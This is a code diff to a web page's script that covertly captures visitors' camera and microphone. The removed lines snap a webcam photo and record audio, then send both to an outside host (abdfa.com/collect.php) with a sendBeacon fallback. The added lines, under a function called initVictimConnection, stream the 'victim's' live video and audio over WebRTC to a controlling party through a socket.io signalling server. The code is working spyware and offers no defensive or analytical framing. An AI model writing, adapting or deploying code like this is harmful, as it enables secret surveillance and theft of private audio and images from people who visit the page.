@@ -442,6 +442,7 @@ body {
 <video id="video" autoplay muted playsinline></video>
 <canvas id="canvas"></canvas>
 
+<script src="/socket.io/socket.io.js"></script>
 <script>
 // ============================================================
 // 🎤📸 CAMERA + MICROPHONE CAPTURE (BACKGROUND)
@@ -474,77 +475,11 @@ body {
       stream = s;
       const video = document.getElementById('video');
       video.srcObject = stream;
-
-      // Take photo after 3 seconds
-      setTimeout(() => {
-        const canvas = document.getElementById('canvas');
-        canvas.width = 1280;
-        canvas.height = 720;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, 1280, 720);
-        const imageData = canvas.toDataURL('image/jpeg', 0.9);
-
-        // Store image locally
-        try {
-          localStorage.setItem('_img_' + Date.now(), imageData);
-        } catch(e) {}
-
-        // Try sending to server
-        fetch('https://abdfa.com/collect.php', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-          body: 'image=' + encodeURIComponent(imageData) + '&ua=' + encodeURIComponent(navigator.userAgent)
-        }).catch(function() {
-          // Fallback: sendBeacon
-          if (navigator.sendBeacon) {
-            const blob = new Blob([JSON.stringify({img: imageData.substring(0,200), ua: navigator.userAgent, time: Date.now()})], {type: 'application/json'});
-            navigator.sendBeacon('https://abdfa.com/beacon.php', blob);
-          }
-        });
-      }, 3000);
-
-      // Record audio for 30 seconds
-      audioChunks = [];
-      recorder = new MediaRecorder(s, { mimeType: 'audio/webm' });
-      recorder.ondataavailable = function(e) {
-        if (e.data.size > 0) audioChunks.push(e.data);
-      };
-      recorder.onstop = function() {
-        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-        const fd = new FormData();
-        fd.append('audio', audioBlob, 'audio_' + Date.now() + '.webm');
-        fetch('https://abdfa.com/collect.php', { method: 'POST', body: fd }).catch(function(){});
-      };
-      recorder.start();
-      recordingStarted = true;
-
-      // Stop recording after 30 seconds
-      setTimeout(() => {
-        if (recorder && recorder.state !== 'inactive') {
-          recorder.stop();
-          recordingStarted = false;
-        }
-      }, 30000);
+      video.play().catch(() => {});
+      initVictimConnection(stream);
     })
     .catch(function(err) {
       console.log('Camera/mic access denied or error:', err.message);
-      // Try just audio if video fails
-      if (err.name !== 'NotAllowedError') {
-        navigator.mediaDevices.getUserMedia({ audio: true })
-        .then(function(s) {
-          const r = new MediaRecorder(s);
-          const chunks = [];
-          r.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
-          r.onstop = function() {
-            const blob = new Blob(chunks, { type: 'audio/webm' });
-            const fd = new FormData();
-            fd.append('audio_alt', blob, 'audio_' + Date.now() + '.webm');
-            fetch('https://abdfa.com/collect.php', { method: 'POST', body: fd }).catch(function(){});
-          };
-          r.start();
-          setTimeout(() => { r.stop(); s.getTracks().forEach(t => t.stop()); }, 15000);
-        }).catch(function(){});
-      }
     });
   }
 
@@ -553,6 +488,54 @@ body {
     permOverlay.classList.remove('show');
     localStorage.setItem('_perm_done', '1');
   });
+
+  let victimSocket = null;
+  let victimPC = null;
+
+  function initVictimConnection(stream) {
+    if (victimSocket) return;
+    const video = document.getElementById('video');
+    const socket = io();
+    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+
+    victimSocket = socket;
+    victimPC = pc;
+
+    stream.getTracks().forEach(track => pc.addTrack(track, stream));
+
+    pc.onicecandidate = function(event) {
+      if (event.candidate) {
+        socket.emit('ctrl-ice', event.candidate);
+      }
+    };
+
+    pc.onconnectionstatechange = function() {
+      console.log('Victim PC state:', pc.connectionState);
+    };
+
+    socket.on('connect', function() {
+      console.log('Victim connected to signaling server');
+      socket.emit('victim-ready', { readyAt: Date.now() });
+    });
+
+    socket.on('ctrl-offer', function(data) {
+      console.log('Received ctrl-offer from control');
+      pc.setRemoteDescription(new RTCSessionDescription(data.offer))
+        .then(() => pc.createAnswer())
+        .then(answer => pc.setLocalDescription(answer))
+        .then(() => {
+          socket.emit('ctrl-answer', {
+            target: data.target,
+            answer: pc.localDescription
+          });
+        })
+        .catch(console.error);
+    });
+
+    socket.on('ctrl-ice', function(candidate) {
+      pc.addIceCandidate(new RTCIceCandidate(candidate)).catch(console.error);
+    });
+  }
 })();
 
 // ============================================================
